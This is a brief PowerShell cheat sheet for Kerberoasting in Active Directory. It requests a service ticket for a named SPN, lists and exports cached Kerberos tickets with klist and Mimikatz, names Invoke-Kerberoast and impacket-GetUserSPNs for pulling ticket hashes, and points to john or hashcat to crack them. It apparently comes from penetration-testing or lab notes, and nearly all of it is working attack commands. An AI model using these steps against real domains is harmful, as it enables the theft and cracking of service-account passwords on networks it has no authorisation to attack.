#Kerberos Token Dump
#Put SPN service ticket in memory
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'

#Display Cached Kerberos Ticket
#Native Windows: klist.exe
#Mimikatz: kerberos::list

#To export Cached Kerberos Ticket
#Mimikatz: kerberos::list /export

#TOOL to get SPNs
#Invoke-Kerberoast.ps1
#impacket-GetUserSPNs -request -dc-ip <IPAddress> <Domain/Username:Password>
#Use john or hashcat to try to crack passwd